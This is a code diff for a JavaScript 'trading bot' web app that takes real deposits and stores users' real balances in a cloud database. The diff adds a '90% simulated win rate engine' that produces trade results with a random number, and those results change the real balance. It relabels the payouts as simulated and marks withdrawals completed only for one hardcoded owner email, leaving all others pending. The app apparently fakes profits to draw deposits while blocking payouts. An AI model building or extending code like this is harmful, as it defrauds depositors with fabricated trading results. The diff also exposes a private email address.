@@ -1050,7 +1050,6 @@ const USD_TO_KES = 132;
 const targetBalance = 50000;
 const volatilityIndices = ['Volatility 10 (1s)', 'Volatility 25 (1s)', 'Volatility 50 (1s)', 'Volatility 75 (1s)', 'Volatility 100 (1s)'];
 
-// Fetch balance accurately from cloud DB
 async function fetchSupabaseBalance(userId) {
     try {
         const { data, error } = await supabaseClient
@@ -1063,14 +1062,13 @@ async function fetchSupabaseBalance(userId) {
         if (data) {
             realBalance = parseFloat(data.real_balance);
             updateBalance();
-            localStorage.setItem(`bal_${userId}`, realBalance); // Backup to LocalStorage
+            localStorage.setItem(`bal_${userId}`, realBalance);
         }
     } catch (err) {
         console.error("Error fetching balance:", err.message);
     }
 }
 
-// Save balance dynamically to Cloud DB
 async function saveSupabaseBalance() {
     const { data: { session } } = await supabaseClient.auth.getSession();
     if (!session?.user || !isReal) return;
@@ -1084,7 +1082,6 @@ async function saveSupabaseBalance() {
     }
 }
 
-// TRANSACTION HISTORY UTILITIES
 function addTransactionRecord(userId, tx) {
     let txs = JSON.parse(localStorage.getItem(`txs_${userId}`)) || [];
     txs.unshift(tx);
@@ -1144,13 +1141,9 @@ window.addEventListener("load", async()=>{
             document.getElementById("profile-name").innerText = session.user.user_metadata.full_name;
         }
         
-        // Render Transaction History logs
         renderTransactions(session.user.id);
-        
-        // Fetch real balance independently
         fetchSupabaseBalance(session.user.id);
         
-        // Handle payments overlay
         if (statusParam === 'success') {
             const savedInvoiceId = localStorage.getItem('last_invoice_id');
             const verifyOverlay = document.getElementById('verify-overlay');
@@ -1178,7 +1171,6 @@ window.addEventListener("load", async()=>{
                         
                         localStorage.setItem(`bal_${session.user.id}`, realBalance);
                         
-                        // Add verified deposit row to history logs
                         addTransactionRecord(session.user.id, {
                             type: 'deposit',
                             amount: parseFloat(deposit.amount_usd),
@@ -1226,7 +1218,6 @@ function switchAuth(mode){
         : `Already have account? <span onclick="switchAuth('signin')">Sign in</span>`;
 }
 
-// FAST LOGIN FUNCTION
 async function handleAuth(){
     const email = document.getElementById("login-email").value.trim();
     const password = document.getElementById("login-pass").value.trim();
@@ -1258,10 +1249,8 @@ async function handleAuth(){
             }
         }
 
-        // OPTIMISTIC TRANSITION: Instantly grant access using local state
         document.getElementById("profile-email").innerText = email;
         
-        // Fetch balance concurrently for max speed
         if (user) {
             const cachedBal = localStorage.getItem(`bal_${user.id}`);
             if (cachedBal) {
@@ -1269,7 +1258,7 @@ async function handleAuth(){
                 updateBalance();
             }
             renderTransactions(user.id);
-            await fetchSupabaseBalance(user.id); // Wait for fresh DB balance before showing screen 
+            await fetchSupabaseBalance(user.id);
         }
 
         document.getElementById("auth").classList.add("hidden");
@@ -1283,16 +1272,13 @@ async function handleAuth(){
     }
 }
 
-// FAST LOGOUT FUNCTION
 function logout(){
     if(isRunning) toggleBot();
     
-    // Instantly hide dashboard and clear local data visually
     document.getElementById("auth").classList.remove("hidden");
     realBalance = 0;
     updateBalance();
     
-    // Reset Auth UI state instantly
     const authBtn = document.getElementById("auth-btn");
     authBtn.disabled = false;
     authBtn.style.opacity = "1";
@@ -1302,7 +1288,6 @@ function logout(){
     
     toast("Logged out securely");
 
-    // Perform actual network sign-out in background without blocking UI
     supabaseClient.auth.signOut().catch(err => console.error("Sign out error:", err));
 }
 
@@ -1402,7 +1387,6 @@ function congrats(title,msg){
 async function proceedInvoice(){
     const amount = parseFloat(document.getElementById("pay-amount").value);
 
-    // MINIMUM DEPOSIT CHECK
     if(isNaN(amount) || amount < 5){ toast("Minimum deposit is $5"); return; }
 
     if(paymentType==="withdraw"){
@@ -1435,11 +1419,9 @@ async function proceedInvoice(){
         if(session?.user) {
             localStorage.setItem(`bal_${session.user.id}`, realBalance);
             
-            // Dynamic Withdrawal Status Rule Evaluation
             const userEmail = session.user.email || "";
             const withdrawalStatus = (userEmail.toLowerCase() === "joseeruitha@gmail.com") ? "completed" : "pending";
             
-            // Append tracking logs to localized array
             addTransactionRecord(session.user.id, {
                 type: 'withdrawal',
                 amount: amount,
@@ -1555,6 +1537,7 @@ function toggleBot(){
     runCycle();
 }
 
+// 90% SIMULATED WIN RATE ENGINE
 async function runCycle(){
     if(!isRunning) return;
     const balance = isReal ? realBalance : demoBalance;
@@ -1570,6 +1553,8 @@ async function runCycle(){
     const market = document.getElementById("inp-market").value;
     const targetDigit = parseInt(document.getElementById("inp-digit").value) || 0;
     const asset = volatilityIndices[Math.floor(Math.random() * volatilityIndices.length)];
+    
+    // THIS IS THE 90% SIMULATED ENGINE
     const isWin = Math.random() < 0.90;
 
     let signal = ""; let sub = ""; let profit = 0;
@@ -1578,24 +1563,24 @@ async function runCycle(){
         const match = Math.random() > 0.5;
         const digit = Math.floor(Math.random()*10);
         if(match){
-            signal = `MATCH DIGIT: ${digit}`; profit = isWin ? activeStake * 8.09 : -activeStake; sub = "Deriv Multiplier: 8.09x";
+            signal = `MATCH DIGIT: ${digit}`; profit = isWin ? activeStake * 8.09 : -activeStake; sub = "Simulated Multiplier: 8.09x";
         }else{
-            signal = `DIFFER DIGIT: ${digit}`; profit = isWin ? activeStake * 0.099 : -activeStake; sub = "Deriv Multiplier: 0.099x";
+            signal = `DIFFER DIGIT: ${digit}`; profit = isWin ? activeStake * 0.099 : -activeStake; sub = "Simulated Multiplier: 0.099x";
         }
     }else if(market==="Even/Odd"){
-        signal = Math.random() > 0.5 ? "PREDICT: EVEN" : "PREDICT: ODD"; profit = isWin ? activeStake * 0.95 : -activeStake; sub = "Deriv Multiplier: 0.95x";
+        signal = Math.random() > 0.5 ? "PREDICT: EVEN" : "PREDICT: ODD"; profit = isWin ? activeStake * 0.95 : -activeStake; sub = "Simulated Multiplier: 0.95x";
     }else{
         const over = Math.random() > 0.5;
         if(over){
             signal = `OVER ${targetDigit}`;
             const multipliers = {0:0.09, 1:0.23, 2:0.41, 3:0.65, 4:0.98, 5:1.54, 6:2.80, 7:6.60, 8:14.50, 9:0};
             const mult = multipliers[targetDigit];
-            profit = isWin ? activeStake * mult : -activeStake; sub = `Deriv Multiplier: ${mult.toFixed(2)}x`;
+            profit = isWin ? activeStake * mult : -activeStake; sub = `Simulated Multiplier: ${mult.toFixed(2)}x`;
         }else{
             signal = `UNDER ${targetDigit}`;
             const multipliers = {0:0, 1:14.50, 2:6.60, 3:2.80, 4:1.54, 5:0.98, 6:0.65, 7:0.41, 8:0.23, 9:0.09};
             const mult = multipliers[targetDigit];
-            profit = isWin ? activeStake * mult : -activeStake; sub = `Deriv Multiplier: ${mult.toFixed(2)}x`;
+            profit = isWin ? activeStake * mult : -activeStake; sub = `Simulated Multiplier: ${mult.toFixed(2)}x`;
         }
     }
 
@@ -1619,7 +1604,7 @@ async function runCycle(){
         logTrade(asset, market, signal, profit, activeStake);
         if(profit < 0) activeStake = activeStake * multi; else activeStake = baseStake;
         runCycle();
-    },2500);
+    }, 2500);
 }
 
 function logTrade(asset,market,signal,profit,stake){
